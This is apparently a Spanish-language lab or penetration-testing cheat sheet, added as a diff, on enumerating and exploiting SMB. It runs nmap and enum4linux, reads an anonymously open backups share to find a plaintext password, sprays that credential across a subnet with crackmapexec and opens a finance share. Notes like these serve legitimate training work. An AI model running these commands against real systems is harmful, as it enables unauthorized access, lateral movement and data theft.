@@ -1,0 +1,47 @@
+******************** SMB Enumeracion y Explotacion ********************
+
+$ nmap -p 139,445 -sV -sC 10.129.140.68 => Escaneo inicial
+
+- 445/tcp open  microsoft-ds Windows Server 2016
+
+$ sudo apt install enum4linux => Instalar enum4linux
+
+$ enum4linux -a 10.129.140.68 => Enumeracion SMB
+
+
+** Ejemplo salida: **
+
+[+] Enumerating users using SID cycling
+user:[alice] rid:[0x3e8]
+user:[bob] rid:[0x3e9]
+
+[+] Share information:
+backups        Disk      Archivos de respaldo
+IPC$              IPC
+
+** Acceso sin contraseña al share: **
+
+$ smbclient //10.129.140.68/backups -N
+
+smb: \> ls => Lista de directorios y archivos
+smb: \> get notes.txt
+smb: \> exit
+
+
+** Maquina Atacante: **
+
+$ cat notes.txt => Leer el contenido del archivo
+
+- alice:MyP@ssw0rd2023!
+
+
+** Movimiento lateral: **
+
+$ crackmapexec smb 10.129.140.0/24 -u alice -p 'MyP@ssw0rd2023!' --shares
+=> Intenta iniciar sesion por SMB en cada IP. Si el inicio de sesion es exitoso,
+     intenta listar los recursos compartidos (--shares) y te informara que nivel de
+     acceso tiene alice
+
+$ smbclient //10.129.140.75/Finanzas -U alice%MyP@ssw0rd2023!
+smb: \>
+
